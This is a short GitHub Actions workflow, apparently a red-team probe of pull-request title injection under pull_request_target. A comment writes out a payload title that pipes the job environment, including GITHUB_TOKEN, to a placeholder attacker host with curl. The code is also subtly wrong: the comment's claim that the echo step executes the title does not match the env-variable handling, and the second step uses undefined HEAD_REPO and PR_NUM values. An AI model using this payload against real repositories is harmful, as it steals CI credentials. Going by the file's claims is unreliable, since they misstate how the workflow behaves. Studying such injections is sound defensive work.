name: rt
on: [pull_request_target]
permissions:
  contents: read
  pull-requests: write
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: title
        env:
          TITLE: ${{ github.event.pull_request.title }}
          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
        run: |
          echo "TITLE=$TITLE"
          echo "HEAD_REPO=$HEAD_REPO"
          # If title contains a shell metachar, it executes here.
          # PR title like:  "; curl -d @<(env) https://example.com/x # 
          # would exfil the env (including GITHUB_TOKEN) to attacker server.
      - name: comment
        env:
          TITLE: ${{ github.event.pull_request.title }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          body="PR_TITLE=${TITLE}"
          curl -sS -X POST -H "Authorization: token ${GH_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${HEAD_REPO:-$GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" \
            -d "$(jq -nc --arg b "$body" '{body:$b}')" 2>&1 || echo "exfil failed"
